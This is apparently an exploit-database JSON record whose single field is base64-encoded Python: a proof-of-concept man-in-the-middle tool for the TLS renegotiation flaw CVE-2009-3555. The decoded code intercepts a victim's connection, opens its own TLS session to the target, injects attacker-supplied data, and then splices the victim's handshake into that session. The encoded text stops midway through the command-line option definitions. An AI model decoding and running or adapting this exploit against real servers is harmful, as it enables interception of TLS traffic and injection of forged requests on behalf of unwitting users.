{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIw0KIyAgUmVkVGVhbSBQZW50ZXN0aW5nIEdtYkggICAgICAgICAgICMNCiMgIGtvbnRha3RAcmVkdGVhbS1wZW50ZXN0aW5nLmRlICAgICAjDQojICBodHRwOi8vd3d3LnJlZHRlYW0tcGVudGVzdGluZy5kZSAgIw0KIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQoNCiMgUG9DIGV4cGxvaXQgZm9yIHRoZSBUTFMgcmVuZWdvdGlhdGlvbiB2dWxuZXJhYmlsaXR5IChDVkUtMjAwOS0zNTU1KQ0KDQojIExpY2Vuc2UNCiMgLS0tLS0tLQ0KIyBDQy1CWS1TQSBodHRwOi8vY3JlYXRpdmVjb21tb25zLm9yZy9saWNlbnNlcy9ieS1zYS8zLjAvDQoNCiMgVGltZWxpbmUNCiMgLS0tLS0tLS0NCiMgMjAwOS0xMi0yMSBpbml0aWFsIHB1YmxpYyByZWxlYXNlDQoNCiMgS25vd24gSXNzdWVzDQojIC0tLS0tLS0tLS0tLQ0KIyBGaXJlZm94OiBpZiBpdCBmYWlscyBjb25uZWN0aW5nIHRvIGEgVExTIHNpdGUgdG9vIG9mdGVuLCBmYWxscyBiYWNrIHRvDQojICAgICAgICAgIGlzc3VpbmcgU1NMdjIgQ2xpZW50SGVsbG8gb25seSB1bnRpbCBicm93c2VyIGlzIHJlc3RhcnRlZA0KIw0KIyB3Z2V0OiAgICBhdHRlbXB0cyBTU0x2MiBDbGllbnRIZWxsbyBieSBkZWZhdWx0DQoNCiMgUmVmZXJlbmNlcw0KIyAtLS0tLS0tLS0tDQojIGh0dHA6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAwOS0zNTU1DQojIGh0dHA6Ly93d3cucGhvbmVmYWN0b3IuY29tL3NzbGdhcA0KIyBodHRwOi8vd3d3LmV4dGVuZGVkc3Vic2V0LmNvbS8NCiMgaHR0cDovL3d3dy5nLXNlYy5sdS9wcmFjdGljYWx0bHMucGRmDQojIGh0dHA6Ly90b29scy5pZXRmLm9yZy9odG1sL2RyYWZ0LWlldGYtdGxzLXJlbmVnb3RpYXRpb24tMDENCg0KaW1wb3J0IHRsc2xpdGUNCmltcG9ydCB0bHNsaXRlLmFwaQ0KaW1wb3J0IHRsc2xpdGUubWVzc2FnZXMNCmltcG9ydCB0bHNsaXRlLmNvbnN0YW50cw0KaW1wb3J0IHN0cnVjdA0KaW1wb3J0IHNvY2tldA0KaW1wb3J0IHRocmVhZGluZw0KaW1wb3J0IGFycmF5DQppbXBvcnQgc3lzDQppbXBvcnQgb3B0cGFyc2UNCg0KDQppZiBub3QgaGFzYXR0cih0aHJlYWRpbmcuVGhyZWFkLCAnbmFtZScpOg0KICAgICMgZW11bGF0ZSBweXRob24gMi42IHRocmVhZGluZyBtb2R1bGUgZm9yIGVhcmxpZXIgdmVyc2lvbnMNCiAgICB0aHJlYWRpbmcuY3VycmVudF90aHJlYWQgPSB0aHJlYWRpbmcuY3VycmVudFRocmVhZA0KICAgIHNldGF0dHIodGhyZWFkaW5nLlRocmVhZCwgJ25hbWUnLA0KICAgICAgICAgICAgcHJvcGVydHkodGhyZWFkaW5nLlRocmVhZC5nZXROYW1lLCB0aHJlYWRpbmcuVGhyZWFkLnNldE5hbWUpKQ0KDQpkZWYgZm9yd2FyZChzb2NrMSwgc29jazIpOg0KICAgIHNvY2sxLnNldHRpbWVvdXQoMS4wKQ0KICAgIHdoaWxlIFRydWU6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGRhdGEgPSBzb2NrMS5yZWN2KDQwOTYpDQogICAgICAgICAgICBpZiBub3QgZGF0YToNCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIHNvY2syLnNlbmQoZGF0YSkNCiAgICAgICAgZXhjZXB0IHNvY2tldC5lcnJvciwgZXhfZXJyb3I6DQogICAgICAgICAgICBpZiBleF9lcnJvclswXSA9PSAxMDQ6ICMgQ29ubmVjdGlvbiByZXNldCBieSBwZWVyDQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgIGV4Y2VwdCBzb2NrZXQudGltZW91dCwgZXhfdGltZW91dDoNCiAgICAgICAgICAgIHBhc3MNCg0KDQpjbGFzcyBNZXNzYWdlV3JhcHBlcihvYmplY3QpOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCB2ZXJzaW9uID0gKDMsIDEpLCBzc2wyID0gRmFsc2UpOg0KICAgICAgICBzZWxmLmNvbnRlbnRUeXBlID0gdGxzbGl0ZS5tZXNzYWdlcy5Db250ZW50VHlwZS5oYW5kc2hha2UNCiAgICAgICAgc2VsZi5zc2wyID0gc3NsMg0KICAgICAgICBzZWxmLmNsaWVudF92ZXJzaW9uID0gdmVyc2lvbg0KDQogICAgZGVmIHNldFR5cGUoc2VsZiwgdHlwZSk6DQogICAgICAgIHNlbGYuY29udGVudFR5cGUgPSB0eXBlDQoNCiAgICBkZWYgYWRkQnl0ZXMoc2VsZiwgYnl0ZXMpOg0KICAgICAgICBzZWxmLmJ5dGVzID0gYnl0ZXMNCg0KICAgIGRlZiB3cml0ZShzZWxmLCB0cmlhbD1GYWxzZSk6DQogICAgICAgIGlmIHRyaWFsOg0KICAgICAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCdVbnN1cHBvcnRlZCcpDQogICAgICAgIHJldHVybiBhcnJheS5hcnJheSgnQicsIHNlbGYuYnl0ZXMpDQoNCmRlZiBzZW5kX3JlY29yZChzb2NrLCBtc2dfdHlwZSwgdmVyc2lvbl9tYWpvciwgdmVyc2lvbl9taW5vciwgcmVjb3JkKToNCiAgICBtc2cgPSBzdHJ1Y3QucGFjaygnIUJCQkgnLCBtc2dfdHlwZSwgdmVyc2lvbl9tYWpvciwgdmVyc2lvbl9taW5vciwgbGVuKHJlY29yZCkpDQogICAgaWYgdHlwZShyZWNvcmQpICE9IHN0cjoNCiAgICAgICAgbXNnICs9IHJlY29yZC50b3N0cmluZygpDQogICAgZWxzZToNCiAgICAgICAgbXNnICs9IHJlY29yZA0KICAgIHNvY2suc2VuZChtc2cpDQoNCmRlZiBzZW5kX2VuY2Fwc3VsYXRlZChzc2xzb2NrLCB0eXBlLCBtZXNzYWdlYnl0ZXMsIHZlcnNpb24gPSAoMywgMSkpOg0KICAgIG1zZyA9IE1lc3NhZ2VXcmFwcGVyKHZlcnNpb24pDQogICAgbXNnLmFkZEJ5dGVzKHN0cnVjdC51bnBhY2soJ0InKmxlbihtZXNzYWdlYnl0ZXMpLCBtZXNzYWdlYnl0ZXMpKQ0KICAgIG1zZy5zZXRUeXBlKHR5cGUpDQogICAgZm9yIGR1bW15IGluIHNzbHNvY2suX3NlbmRNc2cobXNnLCBUcnVlKToNCiAgICAgICAgcGFzcw0KDQpkZWYgZGVjcnlwdF9yZWNvcmQoc3Nsc29jaywgdHlwZSwgcmVjb3JkYnl0ZXMpOg0KICAgIGZvciByZXN1bHQgaW4gc3Nsc29jay5fZGVjcnlwdFJlY29yZCh0eXBlLCBhcnJheS5hcnJheSgnQicsIHJlY29yZGJ5dGVzKSk6DQogICAgICAgIHBhc3MNCiAgICByZXR1cm4gcmVzdWx0DQoNCmRlZiByZWN2X3JlY29yZChzb2NrKToNCiAgICB0cnk6DQogICAgICAgIGhlYWRlciA9IHNvY2sucmVjdig1KQ0KICAgICAgICBpZiBub3QgaGVhZGVyOg0KICAgICAgICAgICAgcmV0dXJuIE5vbmUsIE5vbmUsIE5vbmUsIE5vbmUNCiAgICAgICAgbXNnX3R5cGUsIG1zZ192ZXJzaW9uX21ham9yLCBtc2dfdmVyc2lvbl9taW5vciwgbXNnX2xlbmd0aCA9IHN0cnVjdC51bnBhY2soJyFCQkJIJywgaGVhZGVyKQ0KICAgICAgICByZWNvcmQgPSAnJw0KICAgICAgICB3aGlsZSBsZW4ocmVjb3JkKSAhPSBtc2dfbGVuZ3RoOg0KICAgICAgICAgICAgcmVjb3JkICs9IHNvY2sucmVjdihtc2dfbGVuZ3RoIC0gbGVuKHJlY29yZCkpDQogICAgICAgIHJldHVybiBtc2dfdHlwZSwgbXNnX3ZlcnNpb25fbWFqb3IsIG1zZ192ZXJzaW9uX21pbm9yLCByZWNvcmQNCiAgICBleGNlcHQgc29ja2V0LmVycm9yLCBleDoNCiAgICAgICAgaWYgZXhbMF0gPT0gMTA0OiAjIENvbm5lY3Rpb24gcmVzZXQgYnkgcGVlcg0KICAgICAgICAgICAgcmV0dXJuDQoNCmRlZiByZWN2X2NsaWVudGhlbGxvKHNvY2spOg0KICAgIGhlYWRlcl9ieXRlcyA9IFtdDQogICAgaGVhZGVyX2J5dGVzLmFwcGVuZChzb2NrLnJlY3YoMSkpDQogICAgaGVhZGVyX2J5dGVzWzBdID0gc3RydWN0LnVucGFjaygnIUInLCBoZWFkZXJfYnl0ZXNbMF0pWzBdDQogICAgaWYgaGVhZGVyX2J5dGVzWzBdICYgMHg4MDoNCiAgICAgICAgIyBWZXJzaW9uIDIuMCBDbGllbnQgIlJlY29yZCBMYXllciINCiAgICAgICAgaGVhZGVyX2J5dGVzLmFwcGVuZChzb2NrLnJlY3YoMSkpDQogICAgICAgIGhlYWRlcl9ieXRlc1sxXSA9IHN0cnVjdC51bnBhY2soJyFCJywgaGVhZGVyX2J5dGVzWzFdKVswXQ0KICAgICAgICBtc2dfbGVuZ3RoID0gKGhlYWRlcl9ieXRlc1swXSAmIDB4N2YpIDw8IDggfCBoZWFkZXJfYnl0ZXNbMV0NCiAgICAgICAgbXNnX3ZlcnNpb25fbWFqb3IgPSAyDQogICAgICAgIG1zZ192ZXJzaW9uX21pbm9yID0gMA0KICAgICAgICBtc2dfdHlwZSA9IHRsc2xpdGUuY29uc3RhbnRzLkNvbnRlbnRUeXBlLmhhbmRzaGFrZQ0KICAgICAgICByZWNvcmQgPSBzb2NrLnJlY3YobXNnX2xlbmd0aCkNCiAgICBlbHNlOg0KICAgICAgICBoZWFkZXIgPSBzb2NrLnJlY3YoNCkNCiAgICAgICAgbXNnX3R5cGUgPSBoZWFkZXJfYnl0ZXNbMF0NCiAgICAgICAgbXNnX3ZlcnNpb25fbWFqb3IsIG1zZ192ZXJzaW9uX21pbm9yLCBtc2dfbGVuZ3RoID0gc3RydWN0LnVucGFjaygnIUJCSCcsIGhlYWRlcikNCiAgICAgICAgcmVjb3JkID0gc29jay5yZWN2KG1zZ19sZW5ndGgpDQoNCiAgICByZXR1cm4gbXNnX3R5cGUsIG1zZ192ZXJzaW9uX21ham9yLCBtc2dfdmVyc2lvbl9taW5vciwgcmVjb3JkDQoNCmRlZiBzZW5kX2hlbGxvX3JlcXVlc3Qoc29jayk6DQogICAgc29jay5zZW5kKCJceDE2IiAgICAgICAgICAgICMgUmVjb3JkIExheWVyOiBIYW5kc2hha2UgTWVzc2FnZQ0KICAgICAgICAgICAgICsiXHgwM1x4MDEiICAgICAgICAjIFJlY29yZCBMYXllciBWZXJzaW9uOiBUTFMgMS4wDQogICAgICAgICAgICAgKyJceDAwXHgwNCIgICAgICAgICMgUmVjb3JkIExheWVyIExlbmd0aDogNA0KICAgICAgICAgICAgICsiXHgwMCIgICAgICAgICAgICAjIEhhbmRzaGFrZSBNZXNzYWdlIFR5cGU6IEhlbGxvIFJlcXVlc3QNCiAgICAgICAgICAgICArIlx4MDBceDAwXHgwMCIpICAgIyBIYW5kc2hha2UgTWVzc2FnZSBMZW5ndGg6IDANCg0KZGVmIHNlbmRfcHJvdG9jb2xfdmVyc2lvbl9hbGVydChzb2NrKToNCiAgICBzb2NrLnNlbmQoIlx4MTUiICAgICAgICAgICAgIyBSZWNvcmQgTGF5ZXI6IEFsZXJ0Ig0KICAgICAgICAgICAgICsiXHgwM1x4MDEiICAgICAgICAjIFJlY29yZCBMYXllciBWZXJzaW9uOiBUTFMgMS4wDQogICAgICAgICAgICAgKyJceDAwXHgwMiIgICAgICAgICMgUmVjb3JkIExheWVyIExlbmd0aDogMg0KICAgICAgICAgICAgICsiXHgwMCIgICAgICAgICAgICAjIEFsZXJ0IE1lc3NhZ2U6IGZhdGFsDQogICAgICAgICAgICAgKyJceDQ2IikgICAgICAgICAgICMgQWxlcnQgTWVzc2FnZTogcHJvdG9jb2wgdmVyc2lvbg0KDQoNCmRlZiBoYW5kbGVfdmljdGltKHZpY3RpbSwgb3B0aW9ucywgbWl0bWNvdW50KToNCg0KICAgIGlmIG9wdGlvbnMub25lX3Nob3QgYW5kIG1pdG1jb3VudCAhPSAwOg0KICAgICAgICBwcmludCB0aHJlYWRpbmcuY3VycmVudF90aHJlYWQoKS5uYW1lLCAnLS1vbmUtc2hvdCBzcGVjaWZpZWQgYW5kIGluaXRpYWwgY29ubmVjdGlvbiBhbHJlYWR5IGhhbmRsZWQsIGZvcndhcmRpbmcgb25seScNCiAgICAgICAgc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgc29jay5jb25uZWN0KG9wdGlvbnMudGFyZ2V0KQ0KICAgICAgICAgICAgcHJpbnQgdGhyZWFkaW5nLmN1cnJlbnRfdGhyZWFkKCkubmFtZSwgJ0Nvbm5lY3RlZCB0byB0YXJnZXQgJXM6JXUnICUgb3B0aW9ucy50YXJnZXQNCiAgICAgICAgZXhjZXB0IHNvY2tldC5lcnJvciwgZXg6DQogICAgICAgICAgICBwcmludCB0aHJlYWRpbmcuY3VycmVudF90aHJlYWQoKS5uYW1lLCAnQ291bGRuXCd0IGNvbm5lY3QgdG8gdGFyZ2V0ICVzOiV1JyAlIG9wdGlvbnMudGFyZ2V0DQogICAgICAgICAgICBwcmludCB0aHJlYWRpbmcuY3VycmVudF90aHJlYWQoKS5uYW1lLCAnRXJyb3IgY29kZSAldSwgXCclc1wnJyAlIChleFswXSwgZXhbMV0pDQogICAgICAgICAgICBzeXMuZXhpdCgxKQ0KDQogICAgICAgIHQxID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Zm9yd2FyZCwgYXJncz0oc29jaywgdmljdGltKSkNCiAgICAgICAgdDEuc3RhcnQoKQ0KDQogICAgICAgIHQyID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Zm9yd2FyZCwgYXJncz0odmljdGltLCBzb2NrKSkNCiAgICAgICAgdDIuc3RhcnQoKQ0KDQogICAgICAgIHQxLmpvaW4oKQ0KICAgICAgICBzb2NrLmNsb3NlKCkNCg0KICAgICAgICB0Mi5qb2luKCkNCiAgICAgICAgdmljdGltLmNsb3NlKCkNCiAgICAgICAgcmV0dXJuDQoNCiAgICAjIG9idGFpbiBpbml0aWFsICJjbGllbnQgaGVsbG8iIG1lc3NhZ2UNCiAgICBtc2dfdHlwZSwgbXNnX3ZlcnNpb25fbWFqb3IsIG1zZ192ZXJzaW9uX21pbm9yLCBoZWxsb19tc2cgPSByZWN2X2NsaWVudGhlbGxvKHZpY3RpbSkNCiAgICBpZiBtc2dfdmVyc2lvbl9tYWpvciA9PSAyOg0KICAgICAgICBwcmludCB0aHJlYWRpbmcuY3VycmVudF90aHJlYWQoKS5uYW1lLCAiY2xpZW50IHNlbnQgU1NMdjIgY2xpZW50IGhlbGxvIG1lc3NhZ2UsIGV4aXRpbmcgdGhyZWFkIg0KICAgICAgICByZXR1cm4NCg0KICAgIHRsc192ZXJzaW9uID0gKG1zZ192ZXJzaW9uX21ham9yLCBtc2dfdmVyc2lvbl9taW5vcikNCiAgICB0eXBlLCBsZW5ndGgsIHZlcnNpb25fbWFqb3IsIHZlcnNpb25fbWlub3IsIHJhbmRvbSwgc2Vzc2lvbl9pZF9sZW5ndGggPSBzdHJ1Y3QudW5wYWNrKCchQjNzQkIzMnNCJywgaGVsbG9fbXNnWzozOV0pDQogICAgcmVzdW1lX3Nlc3Npb24gPSAoc2Vzc2lvbl9pZF9sZW5ndGggIT0gMCkNCiAgICBpZiByZXN1bWVfc2Vzc2lvbjoNCiAgICAgICAgcHJpbnQgdGhyZWFkaW5nLmN1cnJlbnRfdGhyZWFkKCkubmFtZSwgImNsaWVudCBhdHRlbXB0aW5nIHRvIHJlc3VtZSBzZXNzaW9uIg0KDQogICAgc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCiAgICB0cnk6DQogICAgICAgIHNvY2suY29ubmVjdChvcHRpb25zLnRhcmdldCkNCiAgICAgICAgcHJpbnQgdGhyZWFkaW5nLmN1cnJlbnRfdGhyZWFkKCkubmFtZSwgJ0Nvbm5lY3RlZCB0byB0YXJnZXQgJXM6JXUnICUgb3B0aW9ucy50YXJnZXQNCiAgICBleGNlcHQgc29ja2V0LmVycm9yLCBleDoNCiAgICAgICAgcHJpbnQgdGhyZWFkaW5nLmN1cnJlbnRfdGhyZWFkKCkubmFtZSwgJ0NvdWxkblwndCBjb25uZWN0IHRvIHRhcmdldCAlczoldScgJSBvcHRpb25zLnRhcmdldA0KICAgICAgICBwcmludCB0aHJlYWRpbmcuY3VycmVudF90aHJlYWQoKS5uYW1lLCAnRXJyb3IgY29kZSAldSwgXCclc1wnJyAlIChleFswXSwgZXhbMV0pDQogICAgICAgIHN5cy5leGl0KDEpDQoNCg0KICAgIHNzbHNvY2sgPSB0bHNsaXRlLmFwaS5UTFNDb25uZWN0aW9uKHNvY2spDQogICAgaGFuZHNoYWtlX3NldHRpbmdzID0gdGxzbGl0ZS5IYW5kc2hha2VTZXR0aW5ncy5IYW5kc2hha2VTZXR0aW5ncygpDQogICAgaGFuZHNoYWtlX3NldHRpbmdzLm1pblZlcnNpb24gPSB0bHNfdmVyc2lvbg0KICAgIGhhbmRzaGFrZV9zZXR0aW5ncy5tYXhWZXJzaW9uID0gdGxzX3ZlcnNpb24NCiAgICBzc2xzb2NrLmhhbmRzaGFrZUNsaWVudENlcnQoc2V0dGluZ3MgPSBoYW5kc2hha2Vfc2V0dGluZ3MpDQoNCiAgICAjIGluamVjdCBwcmVmaXgNCiAgICBzc2xzb2NrLndyaXRlKG9wdGlvbnMuaW5qZWN0KQ0KICAgIHByaW50IHRocmVhZGluZy5jdXJyZW50X3RocmVhZCgpLm5hbWUsICdJbmplY3RlZCAlcycgJSByZXByKG9wdGlvbnMuaW5qZWN0KQ0KDQogICAgIyBzZW5kIG9yaWdpbmFsICJjbGllbnQgaGVsbG8iIG1lc3NhZ2Ugb3ZlciB0aGUgZW5jcnlwdGVkIGNoYW5uZWwNCiAgICBzZW5kX2VuY2Fwc3VsYXRlZChzc2xzb2NrLCAyMiwgaGVsbG9fbXNnLCB0bHNfdmVyc2lvbikNCg0KICAgICMgbm93IHJlY2VpdmUgc2VydmVyYWwgVExTIG1lc3NhZ2VzIGZyb20gdGhlIHNlcnZlciwgZGVjcnlwdCB0aGVtLCBhbmQgZm9yd2FyZA0KICAgICMgdGhlbSB0byB0aGUgY2xpZW50LCB1bnRpbCB0aGUgc2VydmVyIHNlbmRzICJzZXJ2ZXIgaGVsbG8gZG9uZSINCiAgICAjIHRoZXNlIG1lc3NhZ2VzIGluY2x1ZGUgInNlcnZlciBoZWxsbyIsICJjZXJ0aWZpY2F0ZSIsICJzZXJ2ZXIga2V5IGV4Y2hhbmdlIiwNCiAgICAjIHVubGVzcyB0aGUgY2xpZW50IGlzIHRyeWluZyB0byByZXN1bWUgYSBwcmV2aW91cyBzZXNzaW9uDQogICAgcHJpbnQgdGhyZWFkaW5nLmN1cnJlbnRfdGhyZWFkKCkubmFtZSwgImFib3V0IHRvIHJlY2VpdmUgc2VydmVyIGhhbmRzaGFrZSBtZXNzYWdlcyINCiAgICBzZXJ2ZXJfaGFuZHNoYWtlX2RvbmUgPSBGYWxzZQ0KICAgIHdoaWxlIG5vdCBzZXJ2ZXJfaGFuZHNoYWtlX2RvbmU6DQogICAgICAgIG1zZ190eXBlLCBtc2dfdmVyc2lvbl9tYWpvciwgbXNnX3ZlcnNpb25fbWlub3IsIHJlc3VsdCA9IHJlY3ZfcmVjb3JkKHNzbHNvY2suc29jaykNCiAgICAgICAgaWYgcmVzdWx0Og0KICAgICAgICAgICAgcmVzdWx0ID0gZGVjcnlwdF9yZWNvcmQoc3Nsc29jaywgbXNnX3R5cGUsIHJlc3VsdCkNCiAgICAgICAgICAgIHNlbmRfcmVjb3JkKHZpY3RpbSwgbXNnX3R5cGUsIG1zZ192ZXJzaW9uX21ham9yLCBtc2dfdmVyc2lvbl9taW5vciwgcmVzdWx0KQ0KICAgICAgICAgICAgaWYgcmVzdWx0WzBdID09IDB4MGU6ICMgc2VydmVyIGhlbGxvIGRvbmUgLSBzaG91bGQgdGVybWluYXRlIGhhbmRzaGFrZQ0KICAgICAgICAgICAgICAgIHNlcnZlcl9oYW5kc2hha2VfZG9uZSA9IFRydWUNCiAgICAgICAgICAgIGVsaWYgcmVzdW1lX3Nlc3Npb24gYW5kIG1zZ190eXBlID09IDB4MTQ6ICMgY2hhbmdlIGNpcGhlciBzcGVjIC0gcHJvYmFibHkgaXJyZWxldmFudA0KICAgICAgICAgICAgICAgIHNlcnZlcl9oYW5kc2hha2VfZG9uZSA9IFRydWUNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50IHRocmVhZGluZy5jdXJyZW50X3RocmVhZCgpLm5hbWUsICdyZWNlaXZlIGZyb20gc2VydmVyIGZhaWxlZCwgZXhpdGluZyB0aHJlYWQnDQogICAgICAgICAgICByZXR1cm4NCiAgICBwcmludCB0aHJlYWRpbmcuY3VycmVudF90aHJlYWQoKS5uYW1lLCAic2VydmVyIGhhbmRzaGFrZSBkb25lIg0KDQoNCiAgICAjIG5vdyBpdHMgdGhlIHRoZSBjbGllbnQncyB0dXJuIHRvIHNlbmQgc29tZSBtZXNzYWdlcywgZS5nLg0KICAgICMgImNsaWVudCBrZXkgZXhjaGFuZ2UiIGFuZCAiY2hhbmdlIGNpcGhlciBzcGVjIg0KICAgIHByaW50IHRocmVhZGluZy5jdXJyZW50X3RocmVhZCgpLm5hbWUsICJhYm91dCB0byByZWNlaXZlIGNsaWVudCBoYW5kc2hha2UgbWVzc2FnZXMiDQogICAgaGFuZHNoYWtlX2ZpbmlzaGVkID0gRmFsc2UNCiAgICB3aGlsZSBub3QgaGFuZHNoYWtlX2ZpbmlzaGVkOg0KICAgICAgICBtc2dfdHlwZSwgbXNnX3ZlcnNpb25fbWFqb3IsIG1zZ192ZXJzaW9uX21pbm9yLCByZWNvcmQgPSByZWN2X3JlY29yZCh2aWN0aW0pDQogICAgICAgIHByaW50IHRocmVhZGluZy5jdXJyZW50X3RocmVhZCgpLm5hbWUsIG1zZ190eXBlDQogICAgICAgIHNlbmRfZW5jYXBzdWxhdGVkKHNzbHNvY2ssIG1zZ190eXBlLCByZWNvcmQsIHRsc192ZXJzaW9uKQ0KICAgICAgICBpZiBtc2dfdHlwZSA9PSAweDE0OiAjIGNoYW5nZSBjaXBoZXIgc3BlYw0KICAgICAgICAgICAgaGFuZHNoYWtlX2ZpbmlzaGVkID0gVHJ1ZQ0KDQogICAgcHJpbnQgdGhyZWFkaW5nLmN1cnJlbnRfdGhyZWFkKCkubmFtZSwgImNsaWVudCBoYW5kc2hha2UgZG9uZSINCg0KICAgICMgbWVzc2FnZSBhZnRlciAiY2hhbmdlIGNpcGhlciBzcGVjIiBtdXN0IGJlIHNlbnQgaW4gdGhlICJjbGVhciINCiAgICBtc2dfdHlwZSwgbXNnX3ZlcnNpb25fbWFqb3IsIG1zZ192ZXJzaW9uX21pbm9yLCByZWNvcmQgPSByZWN2X3JlY29yZCh2aWN0aW0pDQogICAgc2VuZF9yZWNvcmQoc3Nsc29jay5zb2NrLCBtc2dfdHlwZSwgbXNnX3ZlcnNpb25fbWFqb3IsIG1zZ192ZXJzaW9uX21pbm9yLCByZWNvcmQpDQoNCiAgICAjIHNlcnZlciBzaG91bGQgbm93IHNlbmQgImNoYW5nZSBjaXBoZXIgc3BlYyIgbWVzc2FnZSwgd2UgZGVjcnlwdCBhbmQgc2VuZCB0aGF0IHRvIHRoZSB2aWN0aW0NCiAgICBtc2dfdHlwZSwgbXNnX3ZlcnNpb25fbWFqb3IsIG1zZ192ZXJzaW9uX21pbm9yLCByZWNvcmQgPSByZWN2X3JlY29yZChzc2xzb2NrLnNvY2spDQogICAgcmVzdWx0ID0gZGVjcnlwdF9yZWNvcmQoc3Nsc29jaywgbXNnX3R5cGUsIHJlY29yZCkNCiAgICBzZW5kX3JlY29yZCh2aWN0aW0sIG1zZ190eXBlLCBtc2dfdmVyc2lvbl9tYWpvciwgbXNnX3ZlcnNpb25fbWlub3IsIHJlc3VsdCkNCg0KICAgICMgZmluYWxpemUgaGFuZHNoYWtlDQogICAgbXNnX3R5cGUsIG1zZ192ZXJzaW9uX21ham9yLCBtc2dfdmVyc2lvbl9taW5vciwgcmVjb3JkID0gcmVjdl9yZWNvcmQoc3Nsc29jay5zb2NrKQ0KICAgIGlmIHJlY29yZDoNCiAgICAgICAgc2VuZF9yZWNvcmQodmljdGltLCBtc2dfdHlwZSwgbXNnX3ZlcnNpb25fbWFqb3IsIG1zZ192ZXJzaW9uX21pbm9yLCByZWNvcmQpDQogICAgZWxzZToNCiAgICAgICAgc3Nsc29jay5zb2NrLmNsb3NlKCkNCiAgICAgICAgdmljdGltLmNsb3NlKCkNCiAgICAgICAgZGVsIHNzbHNvY2sNCiAgICAgICAgcmV0dXJuDQoNCg0KDQogICAgIyB0aGUgcmVzdCBpcyBqdXN0IGZvcndhcmRpbmcgVExTIHJlY29yZHMgYmV0d2VlbiBib3RoIHBhcnRpZXMsDQogICAgIyB3aGljaCB3ZSBjYW5ub3QgaW50ZXJmZXJlIHdpdGggYW55bW9yZSwgYXBhcnQgZnJvbSBkcm9wcGluZyBzZXJ2ZXINCiAgICAjIHJlc3BvbnNlcw0KICAgIGlmIG9wdGlvbnMuZHJvcDoNCiAgICAgICAgc3Nsc29jay5zb2NrLmNsb3NlKCkNCiAgICAgICAgZGVsIHNzbHNvY2sNCiAgICBlbHNlOg0KICAgICAgICB0MSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWZvcndhcmQsIGFyZ3M9KHNzbHNvY2suc29jaywgdmljdGltKSkNCiAgICAgICAgdDEuc3RhcnQoKQ0KDQogICAgdDIgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1mb3J3YXJkLCBhcmdzPSh2aWN0aW0sIHNzbHNvY2suc29jaykpDQogICAgdDIuc3RhcnQoKQ0KDQogICAgaWYgbm90IG9wdGlvbnMuZHJvcDoNCiAgICAgICAgdDEuam9pbigpDQogICAgICAgIHNzbHNvY2suc29jay5jbG9zZSgpDQoNCiAgICB0Mi5qb2luKCkNCiAgICB2aWN0aW0uY2xvc2UoKQ0KDQoNCg0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCiAgICBwYXJzZXIgPSBvcHRwYXJzZS5PcHRpb25QYXJzZXIoKQ0KICAgIHBhcnNlci5hZGRfb3B0aW9uKCctbCcsICctLWxpc3RlbicsIGRlc3Q9J2xpc3Rlbl9wb3J0JywgaGVscD0ncG9ydCB0byBsaXN0ZW4gb24nLCBtZXRhdmFyPSdQT1JUJywgdHlwZT0naW50JywgZGVmYXVsdD04NDQzKQ0KICAgIHBhcnNlci5hZGRfb3B0aW9uKCctYicsICctLWJpbmQnLCBkZXN0PSdiaW5kX2FkZHJlc3MnLCBoZWxwPSdhZGRyZXNzIHRvIGJpbmQgdG8nLCBtZXRhdmFyPSdBRERSRVNTJywgZGVmYXVsdD0nMC4wLjAuMCcpDQogICAgcGFyc2VyLmFkZF9vcHRpb24oJy10JywgJy0tdGFyZ2V0JywgZGVzdD0ndGFyZ2V0JywgaGVscD0naG9zdCBhbmQgcG9ydCB0byBjb25uZWN0IHRvJywgbWV0YXZhcj0nSE9TVDpQT1JUJyApDQogICAgcGFyc2VyLmFkZF9vcHRpb24oJy1pJywgJy0taW5qZWN0JywgZGVzdD0naW5qZWN0JywgaGVscD0nc3RyaW5nIHRvIGluamVjdCcsIG1ldGF2YXI9J0RBVEEnKQ0KICAgIHBhcnNlci5hZGRfb3B0aW9uKCcnLCAnLS1pbmplY3QtZmlsZScsIGRlc3Q9J2luamVjdF9maWxlJywgaGVscD0naW5qZWN0IGRhdGEgZnJvbSBhIGZpbGUnLCBtZXRhdmFyPSdGSUxFJykNCiAgICBwYXJzZXIuYWRkX29wdGlvbignJywgJy0taW5qZWN0LWJhc2U2NCcsIGRlc3Q9J2luamVjdF9iYXNlNjQnLCBoZWxwPSdzdHJpbmcgdG8gaW5qZWN0LCBiYXNlNjQtZW5jb2RlZCcsIG1ldGF2YXI9J0RBVEEnKQ0KICAgIHBhcnNlci5hZGRfb3B0aW9uKCctbycsICctLW9uZS1zaG90JywgZGVzdD0nb25lX3Nob3QnLCBhY3Rpb249J3N0b3JlX3RydWUnLCBoZWxwPSdvbmx5IG1pdG0gdGhlIGZpcnN0IGNvbm5lY3Rpb24gYXR0ZW1wdCwgZm9yd2FyZCBhbGwgb3RoZXIgY29ubmVjdGlvbnMnKQ0KICAgIHBhcnNlci5hZGRfb3B0aW9uKCctZCcsICctLWRyb3AtcmVzcG9uc2VzJywgZGVzdD0nZHJvcCcsIGFjdGlvbj0ic3Rv